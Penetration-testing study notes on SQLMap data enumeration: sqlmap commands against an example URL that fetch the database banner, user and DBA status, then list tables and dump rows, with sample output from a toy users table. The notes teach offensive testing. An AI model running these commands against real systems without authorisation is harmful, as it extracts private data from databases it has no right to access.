## SQLMap Data Exfiltration
* SQLMap has a predefined set of queries for all supported DBMSes
	* e.g. [queries.xml](https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml) for a MySQL DBMS

## Basic DB Data Enumeration
* After successful detection of an SQLi vulnerability
* We can start enumerating other interesting things like the hostname(`--hostname`), current user's name (`--current-user`), current database name (`--current-db`), or password hashes (`--passwords`)
* Enumeration normally starts with basic information
	-   Database version banner (switch `--banner`)
	-   Current username (switch `--current-user`)
	-   Current database name (switch `--current-db`)
	-   Checking if the current user has DBA (administrator) rights

```sh
$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

**Note**: The 'root' user in the database context in the vast majority of cases does not have any relation with the OS user "root", other than that representing the privileged user within the DBMS context. This basically means that the DB user should not have any constraints within the database context, while OS privileges (e.g. file system writing to arbitrary location) should be minimalistic, at least in the recent deployments. The same principle applies for the generic 'DBA' role.

## Table Enumeration
* Use the `--tables` option and specifying the DB name with `-D testdb`

```sh
$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

...SNIP...
[13:59:24] [INFO] fetching tables for database: 'testdb'
Database: testdb
[4 tables]
+---------------+
| member        |
| data          |
| international |
| users         |
+---------------+
```

* Use the `--dump` option and specifying the table name with `-T users` to see its content

```sh
$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb

...SNIP...
Database: testdb

Table: users
[4 entries]
+----+--------+------------+
| id | name   | surname    |
+----+--------+------------+
| 1  | luther | blisset    |
| 2  | fluffy | bunny      |
| 3  | wu     | ming       |
| 4  | NULL   | nameisnull |
+----+--------+------------+

[14:07:18] [INFO] table 'testdb.users' dumped to CSV file '/home/user/.local/share/sqlmap/output/www.example.com/dump/testdb/users.csv'
```

**Tip**: Apart from default CSV, we can specify the output format with the option `--dump-format` to HTML or SQLite, so that we can later further investigate the DB in an SQLite environment.

## Table/Row Enumeration
* When dealing with `large tables with many columns / rows` we can specify the columns (e.g., only `name` and `surname` columns) with the `-C` option to narrow down the rows based on their ordinal number(s) inside the table
* Also a  `--start` and `--stop` options can be specified (e.g., start from 2nd up to 3rd entry)

```sh
$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname

...SNIP...
Database: testdb

Table: users
[4 entries]
+--------+------------+
| name   | surname    |
+--------+------------+
| luther | blisset    |
| fluffy | bunny      |
| wu     | ming       |
| NULL   | nameisnull |
+--------+------------+
```

```sh
$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3

...SNIP...
Database: testdb

Table: users
[2 entries]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
| 3  | wu     | ming    |
+----+--------+---------+
```

## Conditional Enumeration
* If we have a `requirement` to retrieve certain rows based on a known `WHERE` condition (e.g. `name LIKE 'f%'`) we can use the option `--where`

```shell-session
$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

...SNIP...
Database: testdb

Table: users
[1 entry]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
+----+--------+---------+
```

## Full DB Enumeration
* We can use `dump` without specifying a table with `-T`, then all the current database content will be retrieved or `--dump-all` switch, then all the content from all the databases will be retrieved
* In such cases, a user is also advised to include the switch `--exclude-sysdbs` (e.g. `--dump-all --exclude-sysdbs`), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest